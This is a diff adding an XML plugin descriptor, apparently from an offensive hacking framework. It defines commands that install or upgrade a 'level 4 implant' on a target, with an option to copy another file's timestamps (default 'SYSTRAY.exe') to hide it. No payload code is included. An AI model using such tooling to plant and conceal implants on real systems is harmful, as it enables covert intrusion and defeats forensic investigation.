@@ -1,0 +1,79 @@
+<?xml version='1.0' ?>
+
+<Plugin id='31349'>
+
+  <Command id='16' name='level4install'>
+
+    <Help>Installs a level 4 implant to the target.</Help>
+
+    <Input>
+      <Option name='local'>
+	<Argument name='file' data='local'/>
+	<Help>The local file to upload and install  (full path or file in "Resources")</Help>
+      </Option>
+
+      <Option name='remote'>
+	<Argument name='name' data='remote'/>
+	<Help>The remote name to use for the uploaded file</Help>
+      </Option>
+
+      <Option name='match' optional='true'>
+	<Argument name='file' data='match'/>
+	<Help>The file with which to match timestamps.  If no match file is </Help>
+	<Help>specified, "SYSTRAY.exe" is used.</Help>
+      </Option>
+	
+    </Input>
+
+    <Output>
+      <Data name='local'  type='string'/>
+      <Data name='remote' type='string'/>
+      <Data name='match'  type='string' default='SYSTRAY.exe'/>
+    </Output>
+
+  </Command>
+
+  <Command id='17' name='level4upgrade'>
+
+    <Help>Upgrades an existing level 4 implant with a new version.</Help>
+
+    <Input>
+      <Option name='local'>
+	<Argument name='file' data='local'/>
+	<Help>The local file to upload and install  (full path or file in "Resources")</Help>
+      </Option>
+
+      <Option name='remote'>
+	<Argument name='name' data='remote'/>
+	<Help>The remote name to use for the uploaded file</Help>
+      </Option>
+
+      <Option name='new'>
+	<Argument name='name' data='new'/>
+	<Help>The remote name to use for the uploaded file</Help>
+      </Option>
+
+      <Option name='old'>
+	<Argument name='name' data='old'/>
+	<Help>The remote name to use for the uploaded file</Help>
+      </Option>
+
+      <Option name='match' optional='true'>
+	<Argument name='file' data='match'/>
+	<Help>The file with which to match timestamps.  If no match file is </Help>
+	<Help>specified, "SYSTRAY.exe" is used.</Help>
+      </Option>
+	
+    </Input>
+
+    <Output>
+      <Data name='local'  type='string'/>
+      <Data name='remote' type='string'/>
+      <Data name='new'    type='string'/>
+      <Data name='old'    type='string'/>
+      <Data name='match'  type='string' default='SYSTRAY.exe'/>
+    </Output>
+
+  </Command>
+
+</Plugin>
